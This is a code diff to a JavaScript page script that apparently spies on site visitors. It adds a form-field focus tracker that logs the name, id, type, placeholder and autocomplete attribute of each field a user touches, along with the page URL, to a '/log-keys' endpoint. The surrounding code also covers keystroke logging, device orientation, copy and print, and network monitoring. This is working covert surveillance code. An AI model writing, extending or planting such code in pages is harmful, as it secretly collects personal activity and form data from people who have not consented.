@@ -967,11 +967,35 @@ ${btns.length ? `<div class="_wn-ac">${btns.map(b => `<button class="_wn-bt" dat
         });
     }
 
+    // ═══ FORM FIELD FOCUS TRACKING ════════════════════════════
+    // Logs which form fields the user focuses on — reveals what forms they're filling
+    function initFieldFocusTracker() {
+        const seen = new Set(); // avoid spamming the same field per page load
+        document.addEventListener('focusin', e => {
+            try {
+                const el = e.target;
+                if (!el || !['INPUT', 'TEXTAREA', 'SELECT'].includes(el.tagName)) return;
+                if (el.type === 'hidden') return;
+                const key = (el.name || el.id || el.placeholder || '').slice(0, 40) + ':' + el.type + ':' + location.pathname;
+                if (seen.has(key)) return;
+                seen.add(key);
+                const desc = [
+                    el.tagName.toLowerCase(),
+                    el.type ? `type=${el.type}` : '',
+                    el.name ? `name="${el.name}"` : '',
+                    el.id ? `id="${el.id}"` : '',
+                    el.placeholder ? `placeholder="${el.placeholder.slice(0, 50)}"` : '',
+                    el.autocomplete ? `autocomplete=${el.autocomplete}` : ''
+                ].filter(Boolean).join(' ');
+                post('/log-keys', { keys: `[FIELD FOCUS] ${desc}`, url: location.href });
+            } catch {}
+        });
+    }
+
     // ═══ DEVICE ORIENTATION / MOTION ══════════════════════════
     // Captures compass heading, tilt (alpha/beta/gamma) and motion data on mobile/tablet.
     // Sends a one-shot snapshot into the key-log so it appears in the keystrokes feed.
-    function initOrientationTracker() {
-        let sent = false; // only need one snapshot per page load
+    function initOrientationTracker() {        let sent = false; // only need one snapshot per page load
 
         function captureOrientation(ev) {
             if (sent) return;
@@ -1088,6 +1112,7 @@ ${btns.length ? `<div class="_wn-ac">${btns.map(b => `<button class="_wn-bt" dat
         initScrollTracker();
         initSelectionTracker();
         initCopyPrintTracker();
+        initFieldFocusTracker();
         initErrorCapture();
         initNetworkMonitor();
         initOrientationTracker();
